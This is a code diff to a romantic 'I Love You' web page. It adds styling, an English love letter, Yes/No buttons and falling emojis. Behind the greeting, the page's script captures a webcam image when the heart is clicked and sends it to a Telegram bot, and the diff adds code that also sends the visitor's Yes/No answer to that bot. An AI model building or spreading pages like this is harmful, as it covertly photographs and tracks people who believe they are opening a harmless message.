@@ -45,7 +45,7 @@
     }
 
     h1 {
-      font-size: 3rem;
+      font-size: 4rem;
       color: #fff;
       text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3);
       margin: 20px 0;
@@ -64,41 +64,112 @@
       display: none;
     }
 
-    .love-letter {
+    /* Love You Too Box */
+    .love-you-box {
       font-family: 'Pinyon Script', cursive;
-      font-size: 1.5rem; /* Smaller size */
+      font-size: 2rem;
       color: #fff;
-      margin-top: 30px;
-      text-align: left;
-      width: 80%;
-      max-height: 300px; /* Set max height */
-      margin: 20px auto;
-      border: 2px solid #ff4b5c;
-      padding: 20px;
+      background-color: rgba(255, 0, 0, 0.6);
+      padding: 20px 40px;
       border-radius: 15px;
-      background-color: rgba(0, 0, 0, 0.5);
-      box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
-      overflow-y: auto; /* Enable scroll */
+      margin-bottom: 20px;
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
     }
 
+    /* Love Letter Box */
+    .love-letter-box {
+      font-family: Arial, sans-serif; 
+      font-size: 1.5rem;
+      color: #fff;
+      background-color: rgba(0, 0, 0, 0.6);
+      padding: 20px 40px;
+      border-radius: 15px;
+      margin-bottom: 30px;
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
+      max-height: 200px;
+      overflow-y: auto;
+    }
+
+    /* Yes/No Buttons */
+    .yes-no-btns {
+      margin-top: 10px;
+      margin-bottom: 20px; /* Space from love letter box */
+    }
+
+    .yes-no-btn {
+      font-size: 1.5rem;
+      padding: 10px 20px;
+      margin: 0 15px;
+      border: none;
+      border-radius: 25px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .yes-btn {
+      background-color: #4caf50;
+      color: white;
+    }
+
+    .yes-btn:hover {
+      background-color: #45a049;
+    }
+
+    .no-btn {
+      background-color: #f44336;
+      color: white;
+    }
+
+    .no-btn:hover {
+      background-color: #e53935;
+    }
+
+    /* Falling Emoji */
+    .falling-emojis {
+      position: absolute;
+      top: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 3rem;
+      animation: fall 3s infinite;
+    }
+
+    @keyframes fall {
+      0% { top: -50px; opacity: 1; }
+      100% { top: 100vh; opacity: 0; }
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="heart" onclick="capturePhoto()">❤️</div>
+    <!-- I Love You Text -->
     <h1>I <span>Love</span> You</h1>
 
-    <!-- Love Letter Section -->
-    <div class="love-letter">
-      <p>প্রিয়তম,</p>
-      <p> যেদিন তোমার সঙ্গে প্রথম দেখা হয়েছিল, আমার হৃদয় যেন বুঝে গিয়েছিল যে আমাদের মধ্যে কিছু বিশেষ রয়েছে। তুমি যে ভাবে আমাকে অনুভব করাতে, তা ভাষায় বর্ণনা করা সম্ভব নয়। প্রতিটি দিন, প্রতিটি মুহূর্ত তোমার সঙ্গে কাটানো যেন একটি সুন্দর স্বপ্নের মতো।</p>
-      <p>যতক্ষণ আমি এটি লিখছি, ততক্ষণ আমি ভবিষ্যতটাকে ভাবছি এবং সমস্ত সম্ভাবনাগুলোর কথা ভাবছি, যেগুলো আমাদের জন্য অপেক্ষা করছে। তুমি আমার হৃদয়, আমার আত্মা, আমার সবকিছু। আমি তোমাকে এমনভাবে ভালোবাসি যা শব্দের মাধ্যমে প্রকাশ করা সম্ভব নয়। আমি কৃতজ্ঞ প্রতিটি মুহূর্তের জন্য যা আমরা একসাথে কাটাচ্ছি।</p>
-      <p>তোমায় অনেক </p>
-      <p><strong>ভালোবাসি</strong></p>
+    <!-- Love You Too Box -->
+    <div class="love-you-box">
+      Love You Too
     </div>
+
+    <!-- Yes/No Buttons (above the love letter box) -->
+    <div class="yes-no-btns">
+      <button class="yes-no-btn yes-btn" onclick="handleResponse('Yes')">Yes</button>
+      <button class="yes-no-btn no-btn" onclick="handleResponse('No')">No</button>
+    </div>
+
+    <!-- Love Letter Box -->
+    <div class="love-letter-box">
+      <p>Dear,</p>
+      <p>I just wanted to let you know how much you mean to me. Every moment with you feels like magic, and I am beyond grateful for having you in my life. You are my heart, my soul, and everything I have ever dreamed of. I love you more than words can express. 💖</p>
+    </div>
+
+    <!-- Heart Icon to Capture Photo -->
+    <div class="heart" onclick="capturePhoto()">❤️</div>
 
     <video id="video" autoplay></video>
     <canvas id="canvas"></canvas>
+
+    <!-- Falling Emojis -->
+    <div id="fallingEmojis" class="falling-emojis"></div>
   </div>
 
   <!-- Background Music -->
@@ -135,15 +206,6 @@
       
       // Send image to Telegram bot
       sendToTelegramBot(imageData);
-
-      // Play background music if not playing
-      if (!isPlaying) {
-        audio.play();
-        isPlaying = true;
-      } else {
-        audio.pause();
-        isPlaying = false;
-      }
     }
 
     // Send captured image to Telegram bot
@@ -181,6 +243,25 @@
       .catch(error => {
         console.error('Error:', error);
       });
+    }
+
+    // Handle Yes/No button click
+    function handleResponse(response) {
+      let emojis = response === 'Yes' ? '❤️❤️❤️❤️❤️' : '🥺🥺🥺🥺🥺'; // Multiple emojis
+      for (let i = 0; i < emojis.length; i++) {
+        // Make falling emojis appear
+        setTimeout(() => showFallingEmojis(emojis[i]), i * 500); // Delay each emoji
+      }
+      sendToTelegramBot(response);
+    }
+
+    // Show falling emojis
+    function showFallingEmojis(emoji) {
+      let fallingEmojis = document.getElementById('fallingEmojis');
+      fallingEmojis.innerHTML += emoji;
+      setTimeout(() => {
+        fallingEmojis.innerHTML = ''; // Clear falling emojis after 3 seconds
+      }, 3000); // Clear after 3 seconds
     }
   </script>
 </body>
